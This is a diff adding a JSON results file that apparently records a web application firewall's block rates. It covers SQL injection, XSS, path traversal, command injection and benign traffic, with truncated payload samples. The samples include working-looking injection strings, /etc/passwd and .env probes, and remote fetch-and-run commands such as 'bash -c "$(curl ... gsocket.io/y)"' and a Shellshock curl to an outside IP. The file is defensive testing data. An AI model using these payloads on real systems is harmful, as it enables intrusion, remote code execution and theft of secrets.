@@ -1,0 +1,1049 @@
+{
+  "sqli": {
+    "total": 50,
+    "blocked": 50,
+    "statusCounts": {
+      "403": 50
+    },
+    "samples": [
+      {
+        "status": 403,
+        "payload_preview": "/blog/;/plugins/user-registration/assets/js/frontend"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-includes/js/mediaelement+where+0+in+(select+sleep(15)+)+--+"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/http%3A%2F%2F8501779237819759495.owasp.org/my-account/edit-profile/{{ data"
+      },
+      {
+        "status": 403,
+        "payload_preview": "c=0&dir=ltr&load[]=dashicons,buttons,forms,l10n,login&ver=4.9.5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/(/index.php/search/internet"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php'+AND+'1'='1'+--+/2020/04/04/vero-nihil-nam-numquam-ullam-quas"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/'\"/tag/nihil-ut-deleniti-est/feed"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php+and+0+in+(select+sleep(15)+)+--+/2020/04/04/explicabo-qui-fuga-d"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/04+DESC++--+/04/nihil-tenetur-et-ad-in-dolores"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog\";sleep+15;\"/index.php/search/feed"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020%')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL#/03/"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03))+UNION+ALL+SELECT+NULL,NULL,NULL,NULL--+-/27"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03/23+AND+1=1+--+/fuga-aut-recusandae-sed-dolor-quia/embed"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php'+AND+(SELECT+9286+FROM(SELECT+COUNT(*),CONCAT(0x3a727a613a,(SELE"
+      },
+      {
+        "status": 403,
+        "payload_preview": "log=sadSnail5&pwd=l9$WxI&rememberme=forever&wp-submit=Log+In&redirect_to=http://"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/uploads/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-"
+      },
+      {
+        "status": 403,
+        "payload_preview": "c=0&dir=ltr&load[]=dashicons,buttons,forms,l10n,login&ver=4.9.5\"+AND+\"1\"=\"1\"+--+"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03/23\"+AND+(SELECT+*+FROM+(SELECT(SLEEP(5)))cHnw)+AND+\"USXN"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020\"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,N"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=1.0"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=3.7.3"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php+AND+1=2/registration"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020%')+RLIKE+(SELECT+(CASE+WHEN+(5633=8582)+THEN+2020+ELSE+0x28"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog%0Acat+%2Fetc%2Fpasswd%0A/index.php/my-account/edit-profile/{{ data.icon"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog'+AND+'1'='1'+--+/index.php/author/vbechtelar"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog'+UNION+ALL+SELECT+NULL#/index.php/2020/03"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php\"+and+0+in+(select+sleep(15)+)+--+/2020/04/04/explicabo-qui-fuga-"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog+AND+(SELECT+1069+FROM(SELECT+COUNT(*),CONCAT(0x3a727a613a,(SELECT+(ELT(106"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php%')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-includes/js/jquery+AND+1=1+--+"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NU"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/uploads/2020\"+where+0+in+(select+sleep(15)+)+--+/04/4eb284d3-cf"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=4.9.5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/my-account/edit-profile%27+where+0+in+%28select+sleep%2815%29+%2"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03/29\"+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/uploads/2020\"+and+0+in+(select+sleep(15)+)+--+/04/ca053e21-2e95"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=4.9.5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "username=contentMandrill6&password=o$xS04em&user-registration-login-nonce=6eac0e"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/04\"+OR+\"1\"=\"1\"+--+/04/vero-nihil-nam-numquam-ullam-quas/emb"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php%')+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-/"
+      },
+      {
+        "status": 403,
+        "payload_preview": "profile-pic-url=&profile-default-image=http://1.gravatar.com/avatar/14d5b5665405"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum+ORDER+BY+1--+-"
+      },
+      {
+        "status": 403,
+        "payload_preview": "p=+or+1+in+++(++select+@@version++)++--"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php)+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL#/2020/03/29/dist"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog\"+and+0+in+(select+sleep(15)+)+--+/wp-content/uploads/2020"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/my-account/edit-profile%22+where+0+in+%28select+sleep%2815%29+%2"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_c8655413"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur+UNION+ALL+SELE"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog))+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"
+      }
+    ]
+  },
+  "xss": {
+    "total": 50,
+    "blocked": 49,
+    "statusCounts": {
+      "200": 1,
+      "403": 49
+    },
+    "samples": [
+      {
+        "status": 403,
+        "payload_preview": "/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101)."
+      },
+      {
+        "status": 403,
+        "payload_preview": "<div draggable=\"true\" contenteditable>drag me</div><content ondrop=alert(1) cont"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).ch"
+      },
+      {
+        "status": 403,
+        "payload_preview": "kw=\"><script>alert(123)</script>&amp;clt=sch"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<script>+-+-1-+-+alert(1)</script>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<noscript onpaste=\"alert(1)\" contenteditable>test</noscript>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "q=>\"><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem wa"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr("
+      },
+      {
+        "status": 403,
+        "payload_preview": "<meter draggable=\"true\" ondragenter=\"alert(1)\">test</meter>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "section=&amp;from=hp-firsttime-headersearch&amp;query=\">'><script>alert(12345)</"
+      },
+      {
+        "status": 403,
+        "payload_preview": "q=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/uploads/2020/${@print(chr(122).chr(97).chr(112).chr(95).chr(116"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).c"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<content id=x tabindex=1 onactivate=alert(1)></content>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "activedoc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/${119673+576808}/plugins/user-registration/assets/css/sweetalert2"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(1"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<style>@keyframes x{}</style><frameset style=\"animation-name:x\" onanimationstart"
+      },
+      {
+        "status": 403,
+        "payload_preview": "rid=file:\ncontent-type: text/html;charset=utf-7\n\n+adw-script+ad4-alert('xss');+a"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/04/';print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(1"
+      },
+      {
+        "status": 403,
+        "payload_preview": "searwords=\">'><script>alert(123)</script>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "menu_id=\"><script>alert(/xss/)</script>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "t=\"><script>alert(document.cookie)</script>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).ch"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/my-account/edit-profile/\";print(chr(122).chr(97).chr(112).chr(95"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr("
+      },
+      {
+        "status": 403,
+        "payload_preview": "<bdi onbeforecut=\"alert(1)\" contenteditable>test</bdi>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=4.9.5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_8992be70/description_en.html"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=1.0"
+      },
+      {
+        "status": 403,
+        "payload_preview": "dln=27537&amp;ctportalnav=\"/><iframe src=http://google.com></iframe><script src="
+      },
+      {
+        "status": 403,
+        "payload_preview": "id=\"><script>alert(document.cookie)</script>><marquee><h1>ehl-i beyt</h1></marqu"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<audio/**/onloadstart='(_=/**/confirm/**/(1))'/src><!--renwax23"
+      },
+      {
+        "status": 403,
+        "payload_preview": "tab=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;!--&quot;&a"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).ch"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/04/04/${@print(chr(122).chr(97).chr(112).chr(95).chr(116).c"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;&amp;src="
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/2020/\";print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111)"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/category/;print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(1"
+      },
+      {
+        "status": 200,
+        "payload_preview": "password_current=snieuC$l&password_1=snieuC$l&password_2=snieuC$l&_wpnonce=b9dad"
+      },
+      {
+        "status": 403,
+        "payload_preview": "rel=de&amp;reserve-mode=active&amp;content-id=1160330080062&amp;presse_id=120517"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<meta onkeyup=\"alert(1)\" contenteditable>test</meta>"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&g"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/wp-comments-post.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=1.0"
+      },
+      {
+        "status": 403,
+        "payload_preview": "advanced=1&amp;text=/&quot;&gt;&lt;script&gt;alert('xss byatm0n3r')&lt;/script&g"
+      },
+      {
+        "status": 403,
+        "payload_preview": "sog=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;"
+      }
+    ]
+  },
+  "path_traversal": {
+    "total": 50,
+    "blocked": 50,
+    "statusCounts": {
+      "403": 50
+    },
+    "samples": [
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/themes/../../../../../../../../../../../../../../../../etc/pass"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/website/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/api/shared/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/apps/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=4.9.5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env.test.sample"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\/2020/04/aa129"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env.development"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.git/logs/refs/heads/master"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.git/HEAD"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/v1/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/backup/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C."
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/themes//../../../../../../../../../../../../../../../../etc/pas"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/core/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env.bak"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.git/config"
+      },
+      {
+        "status": 403,
+        "payload_preview": "username=thrilledTuna8&password=Xtgqh_Nj&user-registration-login-nonce=6eac0e2d5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/mail/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.git/FETCH_HEAD"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/new/.env.staging"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/plugins/user-registration/assets/js/frontend/.svn/text-base/use"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/docker/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "_wpnonce=14237a84a5"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.git/description"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/public/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php//../../../../../../../../../../../../../../../..//lost-password"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\/my-account"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/sample-page/\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\/em"
+      },
+      {
+        "status": 403,
+        "payload_preview": "//sites/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-includes/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\/imgareaselect"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/../../../../../../../../../../../../../../../../etc/passwd/category"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/laravel/core/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_ab1572d861/d_8a1d648962/d_3d5694e8d7/d_51a3d7217f/d_8a1d648962/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/sitemaps/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env.old"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php//../../../../../../../../../../../../../../../../etc/passwd/03/2"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/wp-content/uploads/2020/04/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\.."
+      },
+      {
+        "status": 403,
+        "payload_preview": "/dev/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "reauth=1&redirect_to=http://test-site.com/blog/wp-admin/profile.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/blog/index.php/sample-page//../../../../../../../../../../../../../../../..//fe"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/backend/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/.env"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/backend/.env"
+      }
+    ]
+  },
+  "cmdi": {
+    "total": 50,
+    "blocked": 48,
+    "statusCounts": {
+      "200": 2,
+      "403": 48
+    },
+    "samples": [
+      {
+        "status": 403,
+        "payload_preview": "route"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=1.8.2.1\nsleep+15\n"
+      },
+      {
+        "status": 403,
+        "payload_preview": "first_name=ZAP&user_login=boredChile9&user_pass=ZAP&&sleep+15&user_confirm_passw"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=1.11.4'&sleep+15&'"
+      },
+      {
+        "status": 403,
+        "payload_preview": "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln="
+      },
+      {
+        "status": 403,
+        "payload_preview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "action=exec&cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 200,
+        "payload_preview": "username=grumpySeagull5&password=sbRcf_s'&sleep+15&'&user-registration-login-non"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(10"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/wp-includesSimplePiegzdecodes.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_cc03c877/d_4a36cab6/d_efd8830b/d_e5f0615e/uploadify.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "username=pacifiedDingo9&password=5Ym!8-M#&user-registration-login-nonce=6eac0e2d"
+      },
+      {
+        "status": 403,
+        "payload_preview": "profile-pic-url=&profile-default-image=http://1.gravatar.com/avatar/14d5b5665405"
+      },
+      {
+        "status": 403,
+        "payload_preview": "a|/usr/bin/id"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_3b1ec613/d_bd205cb5/gzdecodes.php.suspected"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_68d41c91/d_8321b918/upload.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(10"
+      },
+      {
+        "status": 403,
+        "payload_preview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "/wp-comments-post.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "action=exec&cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=1.12.4\"&sleep+15&\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=4.9.5&sleep+15&"
+      },
+      {
+        "status": 403,
+        "payload_preview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "user_login=kindGarlic1&sleep+15&&redirect_to=&wp-submit=Get+New+Password"
+      },
+      {
+        "status": 403,
+        "payload_preview": "action=exec&cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "<?php exec('echo 7lwd65hjtopctj0reeqt',$colm);echo join(\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "username=rafael&password=españa01&&sleep+15&user-registration-login-nonce=6eac0e"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(10"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=()+{+:;};+echo+'X-Powered-By:+ShellShock-Vulnerable'"
+      },
+      {
+        "status": 403,
+        "payload_preview": "cmd=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "& type %SYSTEMROOT%\\repair\\SYSTEM"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=()+{+:;};+echo+'X-Powered-By:+ShellShock-Vulnerable'"
+      },
+      {
+        "status": 403,
+        "payload_preview": "username=aloofJaguar5&password=v$mXF&user-registration-login-nonce=6eac0e2d5f&_w"
+      },
+      {
+        "status": 403,
+        "payload_preview": "%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%"
+      },
+      {
+        "status": 200,
+        "payload_preview": "username=morbidOryx6&password=0r9yJ&sleep$mc+15&&user-registration-login-nonce=6"
+      },
+      {
+        "status": 403,
+        "payload_preview": "Fox=d3wL7"
+      },
+      {
+        "status": 403,
+        "payload_preview": "exec=bash -c \"$(curl -fsSL https://gsocket.io/y)\""
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_3b1ec613/d_bd205cb5/gzdecodes.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "first_name=ZAP&user_login=unhappyWeaver4&user_pass=ZAP`sleep+15`&user_confirm_pa"
+      },
+      {
+        "status": 403,
+        "payload_preview": "user_login=brainyJerky7&redirect_to=&wp-submit=Get+New+Password"
+      },
+      {
+        "status": 403,
+        "payload_preview": "comment=&author=pluckyWhiting2&email=foo-bar@example.com&url=http://www.example."
+      },
+      {
+        "status": 403,
+        "payload_preview": "/d_3c2c4656/d_6bf783eb"
+      },
+      {
+        "status": 403,
+        "payload_preview": "%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/wp-login.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/wp-plain.php"
+      },
+      {
+        "status": 403,
+        "payload_preview": "<?php exec('echo jrpkjls7ygpnhzkjcebd',$colm);echo join(\""
+      }
+    ]
+  },
+  "benign": {
+    "total": 50,
+    "blocked": 50,
+    "statusCounts": {
+      "403": 50
+    },
+    "samples": [
+      {
+        "status": 403,
+        "payload_preview": "dsp_id=46&user_id=k-IzJD6wUasqwXFUhJGkSmIRWHUCT0-JYuSZGdGQ&expires=30"
+      },
+      {
+        "status": 403,
+        "payload_preview": "modo=entrar&login=annalea&pwd=2aramall77&remember=on&b1=entrar"
+      },
+      {
+        "status": 403,
+        "payload_preview": "a=743949607&v=1216.487a282&to=b11bNhEHVxFRAhJQDVYXeAEXD1YMHxIPVwVUXRQSEQldF1MV&r"
+      },
+      {
+        "status": 403,
+        "payload_preview": "conwid=250&conhei=250&rdid=1997633&dc=3&di=u1997633&s1=1675003766&s2=1689323202&"
+      },
+      {
+        "status": 403,
+        "payload_preview": "id=AW-814160718&l=dataLayer&cx=c"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=1651145922"
+      },
+      {
+        "status": 403,
+        "payload_preview": "pps=3&siteid=2054679093&ref2=https://www.payngo.co.il/checkout/cart/&tzo=-120&ms"
+      },
+      {
+        "status": 403,
+        "payload_preview": "pb=!1m5!1m4!1i8!2i65!3i109!4i256!2m3!1e0!2sm!3i619343580!3m17!2sen-US!3sUS!5e18!"
+      },
+      {
+        "status": 403,
+        "payload_preview": "action=673f66a5-587a-466c-b284-3f467721e865"
+      },
+      {
+        "status": 403,
+        "payload_preview": "p=criteo&uid=k-bo_xLLZUbJO_PUPloiptXoiUjmq5LXVzyTqUaw"
+      },
+      {
+        "status": 403,
+        "payload_preview": "name=UserService&level=METRIC&message=userServiceRequestUserInfo&success=true&ms"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=923625"
+      },
+      {
+        "status": 403,
+        "payload_preview": "3820"
+      },
+      {
+        "status": 403,
+        "payload_preview": "trackId=3b1333d8-dcda-4ab0-b310-470f1bdad460&pid=20634084-7fa1-4691-8aec-fefe002"
+      },
+      {
+        "status": 403,
+        "payload_preview": "call_source=awg&i=1663226774"
+      },
+      {
+        "status": 403,
+        "payload_preview": "id=awbid&awbid_b=AKAmf-DUT2zJtXg5ljPtQ3gwVRDdfUo6YyB32ldWq8B65DMZ_RAtQwe3vi0Du2m"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ntk=fG4f4RpDU-cudCQCNhayjrmKDckTpMK7QLdCHILBkCl1KiCovP-pa0VBzCn1KxLihvFT0klRfdCw"
+      },
+      {
+        "status": 403,
+        "payload_preview": "/keep-itunes-rental-with-noteburner-m4v-converter-plus&t=1396531551269&n=1025977"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=20220914220518"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=2022.817.1.1"
+      },
+      {
+        "status": 403,
+        "payload_preview": "k=ffa7f14b1c5235c8883662876734f832a596de617cd8380ce1025fb21bc92df9&o="
+      },
+      {
+        "status": 403,
+        "payload_preview": "t=dc&aip=1&_r=3&v=1&_v=j96&tid=UA-18501001-1&cid=1331870945.1660475729&jid=16553"
+      },
+      {
+        "status": 403,
+        "payload_preview": "h=healthline.com&p=/nutrition/joys-of-healthy-eating&u=DlTMYHF-AhFD6AqWA&d=healt"
+      },
+      {
+        "status": 403,
+        "payload_preview": "what=139_-1&OpenxProtocol=https://&loc=https://www.alljobs.co.il/SearchResultsGu"
+      },
+      {
+        "status": 403,
+        "payload_preview": "fmt=jpeg&qlt=70,1&op_sharpen=0&resMode=sharp2&op_usm=0.8,1,10,0&fit=crop,0&cropN"
+      },
+      {
+        "status": 403,
+        "payload_preview": "includes=buyNowPayLater,tradeInMessaging,price,totalTechPrice,holidayPriceDealMe"
+      },
+      {
+        "status": 403,
+        "payload_preview": "1shttps://checkout.thehut.com/checkout/&3sAIzaSyCmIAOBM-PT8QjQ0m4l7WD4cAOC_nqrVd"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=1626684426"
+      },
+      {
+        "status": 403,
+        "payload_preview": "name=2202180000&target=OPTIMIZATION_TARGET_SEGMENTATION_CHROME_LOW_USER_ENGAGEME"
+      },
+      {
+        "status": 403,
+        "payload_preview": "v=2&tid=G-75KFQKZVZB&gtm=2oe880&_p=844392316&cid=767162718.1660567188&ul=en-us&s"
+      },
+      {
+        "status": 403,
+        "payload_preview": "ver=2.11.0&d=top-strip-promotion-auto-size&e=en-GB&g=073568f1-148e-5f0c-91e1-0fe"
+      },
+      {
+        "status": 403,
+        "payload_preview": "random=1660209585423&cv=9&fst=1660209585423&num=1&bg=ffffff&guid=ON&resp=Googlem"
+      },
+      {
+        "status": 403,
+        "payload_preview": "s=184023&gdpr_consent=&gdpr=&google_gid=CAESELwPUsPgS7wzNQRVK1BOuYw&google_cver="
+      },
+      {
+        "status": 403,
+        "payload_preview": "_=1660482077294"
+      },
+      {
+        "status": 403,
+        "payload_preview": "id=sodar2&v=225&t=2&li=gpt_2022081001&jk=4077920949202120&bg=!XF-lXxvNAAa4hXTbmI"
+      },
+      {
+        "status": 403,
